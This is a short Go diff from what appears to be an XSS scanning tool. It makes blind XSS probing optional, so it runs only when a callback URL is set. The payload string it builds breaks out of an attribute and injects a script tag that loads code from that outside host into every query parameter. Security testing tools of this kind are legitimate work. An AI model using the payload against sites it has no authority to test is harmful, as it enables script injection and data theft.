@@ -257,15 +257,17 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 				}
 			}
 		}
-		// Static payload
-		spu, _ := url.Parse(target)
-		spd := spu.Query()
-		for spk, _ := range spd {
-			tq := MakeRequestQuery(target, spk, "\"'><script src="+options_string["blind"]+"></script>")
-			tm := map[string]string{"param": spk}
-			tm["type"] = "toBlind"
-			tm["payload"] = "Blind"
-			query[tq] = tm
+		// Blind payload
+		if options_string["blind"] != "" {
+			spu, _ := url.Parse(target)
+			spd := spu.Query()
+			for spk, _ := range spd {
+				tq := MakeRequestQuery(target, spk, "\"'><script src="+options_string["blind"]+"></script>")
+				tm := map[string]string{"param": spk}
+				tm["type"] = "toBlind"
+				tm["payload"] = "Blind"
+				query[tq] = tm
+			}
 		}
 
 		DalLog("SYSTEM", "Start XSS Scanning.. with "+strconv.Itoa(len(query))+" 🗡")
@@ -275,7 +277,6 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 		time.Sleep(1 * time.Second) // Waiting log
 		s.Start()                   // Start the spinner
 		time.Sleep(3 * time.Second) // Run for some time to simulate work
-
 		for k, v := range query {
 			if v_status[v["param"]] == false {
 				resbody, resp := SendReq(k, options_string)
